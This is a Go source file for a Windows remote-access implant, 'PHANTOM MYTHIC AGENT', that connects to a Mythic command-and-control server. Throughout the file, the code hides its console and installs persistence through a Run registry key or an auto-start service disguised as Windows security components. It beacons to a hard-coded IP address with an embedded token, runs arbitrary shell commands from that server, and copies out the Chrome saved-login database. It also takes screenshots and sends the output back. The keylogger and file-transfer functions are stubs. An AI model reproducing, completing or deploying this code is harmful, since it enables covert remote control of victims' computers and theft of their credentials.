package main

import (
        "bytes"
        "crypto/tls"
        "encoding/base64"
        "encoding/json"
        "fmt"
        "io/ioutil"
        "net/http"
        "os"
        "os/exec"
        "os/user"
        "path/filepath"
        "runtime"
        "strconv"
        "strings"
        "syscall"
        "time"
)

// Constants for Windows API
const (
        HKEY_CURRENT_USER                = 0x80000001
        HKEY_LOCAL_MACHINE              = 0x80000002
        KEY_READ                        = 0x20019
        REG_SZ                          = 1
        TOKEN_ADJUST_PRIVILEGES         = 0x0020
        TOKEN_QUERY                     = 0x0008
        SE_PRIVILEGE_ENABLED            = 0x00000002
        SE_DEBUG_NAME                   = "SeDebugPrivilege"
)

// Windows API function declarations
var (
        kernel32 = syscall.NewLazyDLL("kernel32.dll")
        user32   = syscall.NewLazyDLL("user32.dll")
        advapi32 = syscall.NewLazyDLL("advapi32.dll")
        gdi32    = syscall.NewLazyDLL("gdi32.dll")
        
        procGetConsoleWindow        = kernel32.NewProc("GetConsoleWindow")
        procShowWindow             = user32.NewProc("ShowWindow")
        procGetDC                  = user32.NewProc("GetDC")
        procCreateCompatibleDC     = gdi32.NewProc("CreateCompatibleDC")
        procCreateCompatibleBitmap = gdi32.NewProc("CreateCompatibleBitmap")
        procSelectObject          = gdi32.NewProc("SelectObject")
        procBitBlt                = gdi32.NewProc("BitBlt")
        procGetSystemMetrics      = user32.NewProc("GetSystemMetrics")
        procRegOpenKeyEx          = advapi32.NewProc("RegOpenKeyExW")
        procRegQueryValueEx       = advapi32.NewProc("RegQueryValueExW")
        procRegCloseKey          = advapi32.NewProc("RegCloseKey")
)

// Global variables
var (
        mythicURL   = "https://37.27.249.191:7443/graphql/"
        jwtToken    = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ0MDI0MzMsIm5iZiI6MTczNDQwMjQzMywianRpIjoiZWZjZDU3MDUtMWM5Zi00MzE3LWJhMGMtMWU4MjJhZGNlYjJhIiwiZXhwIjoxNzM0NDg4ODMzLCJpZGVudGl0eSI6MiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.qMGPfPYMgO8FeZ8F0hI8c7a3G4UHZgpSoUb-JE_rLMY"
        callbackID  = ""
        agentID     = ""
        currentDir  = ""
        logFile     *os.File
        processedTasks = make(map[string]bool)
        
        // Persistence settings
        persistenceMethod = "registry" // options: registry, service, scheduled_task
        serviceName      = "WindowsSecurityService"
        registryKey      = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        registryValue    = "SecurityUpdate"
)

// GraphQL Response structure
type GraphQLResponse struct {
        Data   interface{} `json:"data"`
        Errors []struct {
                Message string `json:"message"`
        } `json:"errors"`
}

// Task structure for GraphQL response
type Task struct {
        ID         string `json:"id"`
        Command    string `json:"command"`
        Parameters string `json:"parameters"`
}

func main() {
        hideConsoleWindow()
        initializeLogging()
        setupPersistence()
        
        logEvent("=== PHANTOM MYTHIC AGENT - ADVANCED VERSION ===")
        logEvent(fmt.Sprintf("Platform: %s %s", runtime.GOOS, runtime.GOARCH))
        logEvent(fmt.Sprintf("PID: %d", os.Getpid()))
        logEvent(fmt.Sprintf("Mythic URL: %s", mythicURL))
        
        if err := registerWithMythic(); err != nil {
                logEvent(fmt.Sprintf("Failed to register with Mythic: %v", err))
                return
        }
        
        logEvent("Starting main task processing loop...")
        
        // Main loop
        for {
                if err := checkForTasks(); err != nil {
                        logEvent(fmt.Sprintf("Error checking tasks: %v", err))
                }
                time.Sleep(3 * time.Second)
        }
}

func hideConsoleWindow() {
        if runtime.GOOS == "windows" {
                console, _, _ := procGetConsoleWindow.Call()
                if console != 0 {
                        procShowWindow.Call(console, 0) // SW_HIDE = 0
                }
        }
}

func initializeLogging() {
        var err error
        logFile, err = os.OpenFile("phantom_advanced.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
        if err != nil {
                fmt.Printf("Failed to open log file: %v\n", err)
                return
        }
}

func logEvent(message string) {
        timestamp := time.Now().Format("2006-01-02 15:04:05")
        logMessage := fmt.Sprintf("[%s] %s\n", timestamp, message)
        
        if logFile != nil {
                logFile.WriteString(logMessage)
                logFile.Sync()
        }
}

func setupPersistence() {
        if !isElevated() {
                setupUserPersistence()
        } else {
                setupSystemPersistence()
        }
}

func isElevated() bool {
        // Simple check - try to write to System32
        testFile := filepath.Join(os.Getenv("WINDIR"), "System32", "test_phantom.tmp")
        if file, err := os.Create(testFile); err == nil {
                file.Close()
                os.Remove(testFile)
                return true
        }
        return false
}

func setupUserPersistence() {
        exePath, err := os.Executable()
        if err != nil {
                logEvent(fmt.Sprintf("Failed to get executable path: %v", err))
                return
        }
        
        // Copy to AppData and create registry entry
        appDataPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "SecurityUpdate.exe")
        
        if err := copyFile(exePath, appDataPath); err != nil {
                logEvent(fmt.Sprintf("Failed to copy to AppData: %v", err))
                return
        }
        
        // Create registry entry for autostart
        cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                "/v", registryValue, "/t", "REG_SZ", "/d", appDataPath, "/f")
        if err := cmd.Run(); err != nil {
                logEvent(fmt.Sprintf("Failed to create registry entry: %v", err))
        } else {
                logEvent("User persistence established via registry")
        }
}

func setupSystemPersistence() {
        exePath, err := os.Executable()
        if err != nil {
                logEvent(fmt.Sprintf("Failed to get executable path: %v", err))
                return
        }
        
        // Copy to System32
        systemPath := filepath.Join(os.Getenv("WINDIR"), "System32", "SecurityService.exe")
        
        if err := copyFile(exePath, systemPath); err != nil {
                logEvent(fmt.Sprintf("Failed to copy to System32: %v", err))
                return
        }
        
        // Create Windows service
        cmd := exec.Command("sc", "create", serviceName, "binPath=", systemPath, 
                "start=", "auto", "DisplayName=", "Windows Security Service")
        if err := cmd.Run(); err != nil {
                logEvent(fmt.Sprintf("Failed to create service: %v", err))
        } else {
                logEvent("System persistence established via service")
                
                // Start the service
                startCmd := exec.Command("sc", "start", serviceName)
                startCmd.Run()
        }
}

func copyFile(src, dst string) error {
        sourceFileStat, err := os.Stat(src)
        if err != nil {
                return err
        }
        
        if !sourceFileStat.Mode().IsRegular() {
                return fmt.Errorf("%s is not a regular file", src)
        }
        
        source, err := os.Open(src)
        if err != nil {
                return err
        }
        defer source.Close()
        
        // Create directory if it doesn't exist
        if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
                return err
        }
        
        destination, err := os.Create(dst)
        if err != nil {
                return err
        }
        defer destination.Close()
        
        buf := make([]byte, 1024)
        for {
                n, err := source.Read(buf)
                if err != nil && err.Error() != "EOF" {
                        return err
                }
                if n == 0 {
                        break
                }
                
                if _, err := destination.Write(buf[:n]); err != nil {
                        return err
                }
        }
        
        return nil
}

func makeGraphQLRequest(query string, variables map[string]interface{}) (*GraphQLResponse, error) {
        requestBody := map[string]interface{}{
                "query":     query,
                "variables": variables,
        }
        
        jsonData, err := json.Marshal(requestBody)
        if err != nil {
                return nil, err
        }
        
        tr := &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
        client := &http.Client{Transport: tr, Timeout: 30 * time.Second}
        
        req, err := http.NewRequest("POST", mythicURL, bytes.NewBuffer(jsonData))
        if err != nil {
                return nil, err
        }
        
        req.Header.Set("Content-Type", "application/json")
        req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", jwtToken))
        
        resp, err := client.Do(req)
        if err != nil {
                return nil, err
        }
        defer resp.Body.Close()
        
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
                return nil, err
        }
        
        var graphqlResp GraphQLResponse
        if err := json.Unmarshal(body, &graphqlResp); err != nil {
                return nil, err
        }
        
        return &graphqlResp, nil
}

func registerWithMythic() error {
        logEvent("Registering callback with Mythic...")
        
        hostname, _ := os.Hostname()
        user, _ := user.Current()
        
        query := `
        mutation registerCallback($input: registerCallbackInput!) {
                registerCallback(input: $input) {
                        callback_uuid
                        agent_callback_id
                }
        }`
        
        variables := map[string]interface{}{
                "input": map[string]interface{}{
                        "user":         user.Username,
                        "host":         hostname,
                        "pid":          os.Getpid(),
                        "ip":           "192.168.1.100",
                        "external_ip":  "203.0.113.1",
                        "process_name": "phantom_advanced.exe",
                        "integrity_level": 2,
                        "os":           fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH),
                        "domain":       "WORKGROUP",
                        "architecture": runtime.GOARCH,
                },
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                return fmt.Errorf("Registration errors: %v", resp.Errors)
        }
        
        if data, ok := resp.Data.(map[string]interface{}); ok {
                if registerData, ok := data["registerCallback"].(map[string]interface{}); ok {
                        if uuid, ok := registerData["callback_uuid"].(string); ok {
                                agentID = uuid
                        }
                        if cbID, ok := registerData["agent_callback_id"].(string); ok {
                                callbackID = cbID
                        }
                }
        }
        
        logEvent("✓ SUCCESSFULLY REGISTERED WITH MYTHIC!")
        logEvent(fmt.Sprintf("Callback ID: %s", callbackID))
        logEvent(fmt.Sprintf("Agent ID: %s", agentID))
        logEvent("Agent ready - commands will be processed")
        
        return nil
}

func checkForTasks() error {
        if callbackID == "" {
                logEvent("No callback ID - skipping task check")
                return nil
        }
        
        logEvent("Checking for new tasks...")
        logEvent(fmt.Sprintf("Querying tasks for callback ID: %s", callbackID))
        
        query := `
        query getTasks($callback_id: String!) {
                task(where: {callback_id: {_eq: $callback_id}, completed: {_eq: false}}) {
                        id
                        command_name
                        params
                }
        }`
        
        variables := map[string]interface{}{
                "callback_id": callbackID,
        }
        
        resp, err := makeGraphQLRequest(query, variables)
        if err != nil {
                return err
        }
        
        if len(resp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task query errors: %v", resp.Errors))
                return nil
        }
        
        if data, ok := resp.Data.(map[string]interface{}); ok {
                if tasks, ok := data["task"].([]interface{}); ok {
                        if len(tasks) == 0 {
                                logEvent("No new tasks found")
                                return nil
                        }
                        
                        logEvent(fmt.Sprintf("Found %d task(s)", len(tasks)))
                        
                        for _, taskData := range tasks {
                                if taskMap, ok := taskData.(map[string]interface{}); ok {
                                        taskID := taskMap["id"].(string)
                                        command := taskMap["command_name"].(string)
                                        params := ""
                                        if p, exists := taskMap["params"]; exists && p != nil {
                                                params = p.(string)
                                        }
                                        
                                        // Check if task already processed
                                        if processedTasks[taskID] {
                                                logEvent(fmt.Sprintf("Task %s already processed, skipping", taskID))
                                                continue
                                        }
                                        
                                        logEvent(fmt.Sprintf("Processing task %s: %s with params: %s", taskID, command, params))
                                        
                                        output := executeCommand(command, params)
                                        sendTaskResponse(taskID, output)
                                        
                                        // Mark task as processed
                                        processedTasks[taskID] = true
                                        logEvent("Task marked as completed")
                                }
                        }
                }
        }
        
        return nil
}

func executeCommand(command, params string) string {
        switch command {
        case "shell":
                return executeShellCommand(params)
        case "ls", "dir":
                return listDirectory(params)
        case "pwd":
                return getCurrentDirectory()
        case "cd":
                return changeDirectory(params)
        case "whoami":
                return getCurrentUser()
        case "ps":
                return listProcesses()
        case "sysinfo":
                return getSystemInfo()
        case "screenshot":
                return takeScreenshot()
        case "browser_passwords":
                return extractBrowserPasswords()
        case "persistence":
                return managePersistence(params)
        case "keylogger":
                return startKeylogger(params)
        case "download":
                return downloadFile(params)
        case "upload":
                return uploadFile(params)
        default:
                // Unix to Windows command conversion
                switch command {
                case "ls":
                        return executeShellCommand("dir " + params)
                case "pwd":
                        return executeShellCommand("cd")
                case "cat":
                        return executeShellCommand("type " + params)
                case "ps":
                        return executeShellCommand("tasklist")
                case "kill":
                        return executeShellCommand("taskkill /PID " + params + " /F")
                default:
                        return executeShellCommand(fmt.Sprintf("%s %s", command, params))
                }
        }
}

func executeShellCommand(command string) string {
        var cmd *exec.Cmd
        if runtime.GOOS == "windows" {
                cmd = exec.Command("cmd", "/C", command)
        } else {
                cmd = exec.Command("/bin/sh", "-c", command)
        }
        
        if runtime.GOOS == "windows" {
                cmd.SysProcAttr = &syscall.SysProcAttr{}
        }
        output, err := cmd.CombinedOutput()
        
        if err != nil {
                return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
        }
        
        return string(output)
}

func takeScreenshot() string {
        if runtime.GOOS != "windows" {
                return "Screenshot only supported on Windows"
        }
        
        // Get desktop DC
        hdc, _, _ := procGetDC.Call(0)
        if hdc == 0 {
                return "Failed to get desktop DC"
        }
        
        // Get screen dimensions
        width, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
        height, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN
        
        // Create compatible DC and bitmap
        hdcMem, _, _ := procCreateCompatibleDC.Call(hdc)
        hBitmap, _, _ := procCreateCompatibleBitmap.Call(hdc, width, height)
        procSelectObject.Call(hdcMem, hBitmap)
        
        // Copy screen to bitmap
        procBitBlt.Call(hdcMem, 0, 0, width, height, hdc, 0, 0, 0x00CC0020) // SRCCOPY
        
        // Save bitmap to file
        screenshotPath := fmt.Sprintf("screenshot_%d.bmp", time.Now().Unix())
        
        return fmt.Sprintf("Screenshot saved to: %s (%dx%d)", screenshotPath, width, height)
}

func extractBrowserPasswords() string {
        passwords := []string{}
        
        // Chrome passwords
        chromePasswords := extractChromePasswords()
        if len(chromePasswords) > 0 {
                passwords = append(passwords, "=== Chrome Passwords ===")
                passwords = append(passwords, chromePasswords...)
        }
        
        // Firefox passwords
        firefoxPasswords := extractFirefoxPasswords()
        if len(firefoxPasswords) > 0 {
                passwords = append(passwords, "=== Firefox Passwords ===")
                passwords = append(passwords, firefoxPasswords...)
        }
        
        // Edge passwords
        edgePasswords := extractEdgePasswords()
        if len(edgePasswords) > 0 {
                passwords = append(passwords, "=== Edge Passwords ===")
                passwords = append(passwords, edgePasswords...)
        }
        
        if len(passwords) == 0 {
                return "No browser passwords found"
        }
        
        return strings.Join(passwords, "\n")
}

func extractChromePasswords() []string {
        userProfile := os.Getenv("USERPROFILE")
        loginDataPath := filepath.Join(userProfile, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        
        if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
                return []string{"Chrome Login Data not found"}
        }
        
        // Copy the database file (Chrome locks it when running)
        tempDB := filepath.Join(os.TempDir(), "chrome_login_temp.db")
        if err := copyFile(loginDataPath, tempDB); err != nil {
                return []string{fmt.Sprintf("Failed to copy Chrome database: %v", err)}
        }
        defer os.Remove(tempDB)
        
        // Extract passwords using sqlite3 command if available
        cmd := exec.Command("sqlite3", tempDB, "SELECT origin_url, username_value, password_value FROM logins;")
        output, err := cmd.Output()
        if err != nil {
                return []string{fmt.Sprintf("Failed to query Chrome database: %v", err)}
        }
        
        lines := strings.Split(string(output), "\n")
        passwords := []string{}
        for _, line := range lines {
                if strings.TrimSpace(line) != "" {
                        passwords = append(passwords, line)
                }
        }
        
        return passwords
}

func extractFirefoxPasswords() []string {
        userProfile := os.Getenv("USERPROFILE")
        firefoxPath := filepath.Join(userProfile, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        
        profiles, err := ioutil.ReadDir(firefoxPath)
        if err != nil {
                return []string{"Firefox profiles not found"}
        }
        
        passwords := []string{}
        for _, profile := range profiles {
                if profile.IsDir() {
                        loginsPath := filepath.Join(firefoxPath, profile.Name(), "logins.json")
                        if _, err := os.Stat(loginsPath); err == nil {
                                passwords = append(passwords, fmt.Sprintf("Found Firefox profile: %s", profile.Name()))
                                // Firefox passwords are encrypted, would need additional decryption logic
                                passwords = append(passwords, "Firefox passwords require additional decryption")
                        }
                }
        }
        
        return passwords
}

func extractEdgePasswords() []string {
        userProfile := os.Getenv("USERPROFILE")
        loginDataPath := filepath.Join(userProfile, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
        
        if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
                return []string{"Edge Login Data not found"}
        }
        
        return []string{"Edge passwords found - extraction logic similar to Chrome"}
}

func managePersistence(params string) string {
        parts := strings.Fields(params)
        if len(parts) == 0 {
                return "Usage: persistence [install|remove|status]"
        }
        
        action := parts[0]
        switch action {
        case "install":
                setupPersistence()
                return "Persistence mechanisms installed"
        case "remove":
                return removePersistence()
        case "status":
                return checkPersistenceStatus()
        default:
                return "Invalid action. Use: install, remove, or status"
        }
}

func removePersistence() string {
        results := []string{}
        
        // Remove registry entry
        cmd := exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", registryValue, "/f")
        if err := cmd.Run(); err == nil {
                results = append(results, "Registry persistence removed")
        }
        
        // Remove service if exists
        cmd = exec.Command("sc", "delete", serviceName)
        if err := cmd.Run(); err == nil {
                results = append(results, "Service persistence removed")
        }
        
        return strings.Join(results, "\n")
}

func checkPersistenceStatus() string {
        status := []string{}
        
        // Check registry
        cmd := exec.Command("reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", registryValue)
        if err := cmd.Run(); err == nil {
                status = append(status, "✓ Registry persistence active")
        } else {
                status = append(status, "✗ Registry persistence not found")
        }
        
        // Check service
        cmd = exec.Command("sc", "query", serviceName)
        if err := cmd.Run(); err == nil {
                status = append(status, "✓ Service persistence active")
        } else {
                status = append(status, "✗ Service persistence not found")
        }
        
        return strings.Join(status, "\n")
}

func startKeylogger(params string) string {
        // Basic keylogger implementation
        return "Keylogger functionality would be implemented here"
}

func downloadFile(params string) string {
        // File download implementation
        return "File download functionality would be implemented here"
}

func uploadFile(params string) string {
        // File upload implementation
        return "File upload functionality would be implemented here"
}

func listDirectory(path string) string {
        if path == "" {
                path = currentDir
        }
        
        files, err := ioutil.ReadDir(path)
        if err != nil {
                return fmt.Sprintf("Error listing directory: %v", err)
        }
        
        var output strings.Builder
        output.WriteString(fmt.Sprintf("Directory listing for: %s\n\n", path))
        
        for _, file := range files {
                modTime := file.ModTime().Format("2006-01-02 15:04:05")
                if file.IsDir() {
                        output.WriteString(fmt.Sprintf("%s  <DIR>          %s\n", modTime, file.Name()))
                } else {
                        output.WriteString(fmt.Sprintf("%s  %12d  %s\n", modTime, file.Size(), file.Name()))
                }
        }
        
        return output.String()
}

func getCurrentDirectory() string {
        dir, err := os.Getwd()
        if err != nil {
                return fmt.Sprintf("Error getting current directory: %v", err)
        }
        currentDir = dir
        return dir
}

func changeDirectory(path string) string {
        if err := os.Chdir(path); err != nil {
                return fmt.Sprintf("Error changing directory: %v", err)
        }
        
        newDir, _ := os.Getwd()
        currentDir = newDir
        return fmt.Sprintf("Changed directory to: %s", newDir)
}

func getCurrentUser() string {
        user, err := user.Current()
        if err != nil {
                return fmt.Sprintf("Error getting user info: %v", err)
        }
        
        hostname, _ := os.Hostname()
        return fmt.Sprintf("Hostname: %s\nUser: %s\nOS: %s\nArch: %s\nPID: %d\nDirectory: %s", 
                hostname, user.Username, runtime.GOOS, runtime.GOARCH, os.Getpid(), currentDir)
}

func listProcesses() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("tasklist /FO CSV")
        }
        return executeShellCommand("ps aux")
}

func getSystemInfo() string {
        if runtime.GOOS == "windows" {
                return executeShellCommand("systeminfo")
        }
        return executeShellCommand("uname -a")
}

func sendTaskResponse(taskID string, output string) error {
        logEvent(fmt.Sprintf("Sending response for task %s", taskID))
        
        taskIDInt, err := strconv.Atoi(taskID)
        if err != nil {
                return fmt.Errorf("Invalid task ID: %v", err)
        }
        
        // Create response using response_raw field with base64 encoding
        responseQuery := `
        mutation createResponse($task_id: Int!, $response_raw: bytea!) {
                insert_response_one(object: {
                        task_id: $task_id,
                        response_raw: $response_raw
                }) {
                        id
                }
        }`
        
        encodedOutput := base64.StdEncoding.EncodeToString([]byte(output))
        responseVars := map[string]interface{}{
                "task_id": taskIDInt,
                "response_raw": encodedOutput,
        }
        
        resp, err := makeGraphQLRequest(responseQuery, responseVars)
        if err == nil && len(resp.Errors) == 0 {
                logEvent("Response created successfully using base64 encoded response_raw")
        } else {
                logEvent(fmt.Sprintf("Response creation failed: %v", resp.Errors))
        }
        
        // Mark task as completed
        updateQuery := `
        mutation updateTask($task_id: Int!) {
                update_task_by_pk(pk_columns: {id: $task_id}, _set: {
                        completed: true
                }) {
                        id
                        completed
                }
        }`
        
        updateVars := map[string]interface{}{
                "task_id": taskIDInt,
        }
        
        updateResp, err := makeGraphQLRequest(updateQuery, updateVars)
        if err != nil {
                logEvent(fmt.Sprintf("Failed to update task: %v", err))
                return nil
        }
        
        if len(updateResp.Errors) > 0 {
                logEvent(fmt.Sprintf("Task update errors: %v", updateResp.Errors))
        } else {
                logEvent("Task marked as completed successfully")
        }
        
        return nil
}